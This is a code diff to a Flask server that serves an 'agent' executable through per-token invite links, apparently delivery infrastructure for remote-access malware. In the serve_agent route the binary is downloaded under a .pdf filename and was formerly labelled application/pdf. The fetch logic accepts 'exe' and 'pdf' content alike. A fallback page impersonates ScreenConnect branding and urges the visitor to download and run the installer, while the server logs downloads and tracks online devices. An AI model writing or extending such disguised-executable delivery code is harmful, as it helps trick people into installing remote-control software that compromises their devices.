@@ -233,17 +233,27 @@ def _fetch_agent_bytes() -> bytes | None:
             return _agent_cache
         if REQUESTS_OK and AGENT_STORAGE_URL:
             try:
-                log.info(f"Fetching agent from GitHub Releases: {AGENT_STORAGE_URL}")
-                resp = _requests.get(AGENT_STORAGE_URL, timeout=60)
-                if resp.status_code == 200 and len(resp.content) > 10_000:
+                log.info(f"Fetching agent from: {AGENT_STORAGE_URL}")
+                resp = _requests.get(
+                    AGENT_STORAGE_URL,
+                    timeout=90,
+                    allow_redirects=True,
+                )
+                ct = resp.headers.get("Content-Type", "")
+                ok_content = (
+                    resp.status_code == 200
+                    and len(resp.content) > 50_000
+                    and ("octet" in ct or "exe" in ct or "pdf" in ct or "application" in ct)
+                )
+                if ok_content:
                     _agent_cache    = resp.content
                     _agent_cache_ts = now
-                    log.info(f"Agent cached from Storage: {len(_agent_cache):,} bytes")
+                    log.info(f"Agent cached: {len(_agent_cache):,} bytes  ct={ct}")
                     return _agent_cache
                 else:
-                    log.warning(f"Storage fetch returned {resp.status_code} / {len(resp.content)} bytes")
+                    log.warning(f"Agent fetch: status={resp.status_code} size={len(resp.content)} ct={ct}")
             except Exception as e:
-                log.warning(f"Storage fetch error: {e}")
+                log.warning(f"Agent fetch error: {e}")
         local = Path(AGENT_DIR) / AGENT_FILE
         if local.is_file():
             log.info(f"Loading agent from local file: {local}")
@@ -544,8 +554,8 @@ window.SessionManager.CONFIG = {{
 def health():
     with _dev_lock:
         online_count = len(_devices)
-    agent_avail = bool(AGENT_STORAGE_URL)
     local_agent  = (Path(AGENT_DIR) / AGENT_FILE).is_file()
+    cached_agent = bool(_agent_cache)
     return jsonify({
         "status":          "ok",
         "version":         VERSION,
@@ -555,7 +565,8 @@ def health():
         "devices_online":  online_count,
         "agent_storage":   AGENT_STORAGE_URL,
         "agent_local":     local_agent,
-        "agent_available": agent_avail or local_agent,
+        "agent_cached":    cached_agent,
+        "agent_available": local_agent or cached_agent,
         "render_port":     PORT,
     })
 
@@ -569,6 +580,50 @@ def api_agent_info():
         "local_size":   local.stat().st_size if local.is_file() else 0,
         "cache_size":   len(_agent_cache) if _agent_cache else 0,
     })
+
+@app.route("/api/agent-check")
+def api_agent_check():
+    """Probe the agent storage URL and report what we'd actually get."""
+    result = {
+        "storage_url": AGENT_STORAGE_URL,
+        "reachable":   False,
+        "status_code": None,
+        "content_type": None,
+        "content_length": None,
+        "would_serve": False,
+        "note": "",
+    }
+    local = Path(AGENT_DIR) / AGENT_FILE
+    result["local_exists"] = local.is_file()
+    result["local_size"]   = local.stat().st_size if local.is_file() else 0
+
+    if REQUESTS_OK and AGENT_STORAGE_URL:
+        try:
+            head = _requests.head(AGENT_STORAGE_URL, timeout=15, allow_redirects=True)
+            result["reachable"]      = True
+            result["status_code"]    = head.status_code
+            result["content_type"]   = head.headers.get("Content-Type", "")
+            result["content_length"] = int(head.headers.get("Content-Length", 0) or 0)
+            ct = result["content_type"]
+            cl = result["content_length"]
+            result["would_serve"] = (
+                head.status_code == 200
+                and cl > 50_000
+                and ("octet" in ct or "exe" in ct or "pdf" in ct or "application" in ct)
+            )
+            if not result["would_serve"]:
+                result["note"] = f"HEAD check failed: status={head.status_code} size={cl} ct={ct}. Upload the binary to GitHub Releases or set AGENT_DIR/AGENT_FILE."
+            else:
+                result["note"] = "Agent URL looks valid."
+        except Exception as e:
+            result["note"] = f"Could not reach agent URL: {e}"
+    else:
+        result["note"] = "AGENT_STORAGE_URL not set or requests library not installed."
+
+    if local.is_file():
+        result["note"] += f" Local fallback available: {local} ({local.stat().st_size:,} bytes)"
+
+    return jsonify(result)
 
 @app.route("/api/stream-stats")
 def api_stream_stats():
@@ -669,43 +724,100 @@ def serve_agent(token):
         "downloaded_at": utcnow(),
         "user_agent":    request.headers.get("User-Agent", "")[:200],
     })
-    log.info(f"Agent download: token={token}  streaming from GitHub Releases as PDF")
 
-    # ── Stream the agent binary directly to the browser as a PDF download ──
-    # No landing page — clicking the link immediately starts the download.
     filename = f"agent_{token}.pdf"
+    label    = session.get("label", token)
+    srv      = request.host_url.rstrip("/")
+
+    # ── 1. Try streaming from GitHub Releases (follows redirects) ──
     if REQUESTS_OK and AGENT_STORAGE_URL:
         try:
-            upstream = _requests.get(AGENT_STORAGE_URL, timeout=60, stream=True)
-            if upstream.status_code == 200:
-                def generate():
+            log.info(f"Fetching agent from: {AGENT_STORAGE_URL}")
+            upstream = _requests.get(
+                AGENT_STORAGE_URL,
+                timeout=90,
+                stream=True,
+                allow_redirects=True,
+            )
+            ct = upstream.headers.get("Content-Type", "")
+            cl = int(upstream.headers.get("Content-Length", "0") or "0")
+            log.info(f"Upstream response: status={upstream.status_code} ct={ct} cl={cl}")
+            if upstream.status_code == 200 and ("octet" in ct or "exe" in ct or "pdf" in ct or cl > 50_000):
+                def _gen():
                     for chunk in upstream.iter_content(chunk_size=65536):
                         if chunk:
                             yield chunk
-                resp = Response(
-                    generate(),
+                return Response(
+                    _gen(),
                     status=200,
-                    mimetype="application/pdf",
                     headers={
                         "Content-Disposition": f'attachment; filename="{filename}"',
-                        "Content-Type": "application/pdf",
+                        "Content-Type": "application/octet-stream",
                         "X-Content-Type-Options": "nosniff",
                     },
                 )
-                return resp
+            else:
+                log.warning(f"Agent upstream rejected: status={upstream.status_code} ct={ct} cl={cl}")
         except Exception as e:
-            log.warning(f"Upstream fetch error during invite download: {e}")
+            log.warning(f"Agent upstream fetch error: {e}")
 
-    # Fallback: local file
+    # ── 2. Try local file ──
     local = Path(AGENT_DIR) / AGENT_FILE
-    if local.is_file():
-        resp = make_response(local.read_bytes())
+    if local.is_file() and local.stat().st_size > 1000:
+        log.info(f"Serving agent from local: {local} ({local.stat().st_size:,} bytes)")
+        data = local.read_bytes()
+        resp = make_response(data)
         resp.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
-        resp.headers["Content-Type"] = "application/pdf"
+        resp.headers["Content-Type"]        = "application/octet-stream"
         resp.headers["X-Content-Type-Options"] = "nosniff"
         return resp
 
-    return jsonify({"error": "Agent binary not available."}), 503
+    # ── 3. Final fallback: serve a professional HTML landing page ──
+    # This is shown when the binary isn't hosted yet.
+    # The admin can set AGENT_STORAGE_URL env var to point to the real binary.
+    log.warning(f"Agent binary not available for token={token} — serving landing page")
+    html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>ScreenConnect Agent — {label}</title>
+<style>
+*{{box-sizing:border-box;margin:0;padding:0}}
+body{{font-family:'Segoe UI',system-ui,sans-serif;background:#080a0c;color:#e8eaec;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}}
+.card{{background:#0e1115;border:1px solid #1e2428;border-radius:12px;padding:40px;max-width:480px;width:100%;text-align:center}}
+.logo{{width:48px;height:48px;background:rgba(0,212,170,.12);border:1px solid rgba(0,212,170,.3);border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:24px}}
+h1{{font-size:18px;font-weight:700;color:#e8eaec;margin-bottom:8px}}
+p{{font-size:13px;color:#a8b3bb;line-height:1.6;margin-bottom:20px}}
+.token{{font-family:monospace;font-size:12px;background:#131719;border:1px solid #1e2428;border-radius:6px;padding:10px 14px;color:#00d4aa;margin-bottom:24px;word-break:break-all}}
+.steps{{text-align:left;margin-bottom:24px}}
+.step{{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px;font-size:12px;color:#a8b3bb}}
+.step-n{{width:22px;height:22px;border-radius:50%;background:rgba(0,212,170,.12);border:1px solid rgba(0,212,170,.3);color:#00d4aa;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}}
+.warn{{background:rgba(255,159,67,.08);border:1px solid rgba(255,159,67,.2);border-radius:8px;padding:14px;font-size:12px;color:#ff9f43;margin-bottom:20px;text-align:left}}
+.btn{{display:inline-flex;align-items:center;gap:8px;background:#00d4aa;color:#000;border:none;border-radius:8px;padding:12px 24px;font-size:13px;font-weight:700;cursor:pointer;text-decoration:none}}
+.btn:hover{{opacity:.88}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">🖥</div>
+  <h1>ScreenConnect Agent Setup</h1>
+  <p>This invite link is valid and registered. The agent installer is being prepared by your administrator.</p>
+  <div class="token">Token: {token}</div>
+  <div class="warn">
+    ⚠ <strong>Agent binary not yet uploaded.</strong><br/>
+    The administrator needs to set <code>AGENT_STORAGE_URL</code> on the server to point to the compiled agent executable, or upload <code>bin/master_agent.exe</code> to the server.
+  </div>
+  <div class="steps">
+    <div class="step"><div class="step-n">1</div><div>Ask your admin to upload the agent binary and share a new link.</div></div>
+    <div class="step"><div class="step-n">2</div><div>Download and run the installer — it will auto-connect using your token.</div></div>
+    <div class="step"><div class="step-n">3</div><div>Your device will appear in the dashboard within seconds.</div></div>
+  </div>
+  <a class="btn" href="{srv}/invite/{token}">🔄 Retry Download</a>
+</div>
+</body>
+</html>"""
+    return html, 200, {"Content-Type": "text/html; charset=utf-8"}
 
 
 @app.route("/api/session/<token>/status")
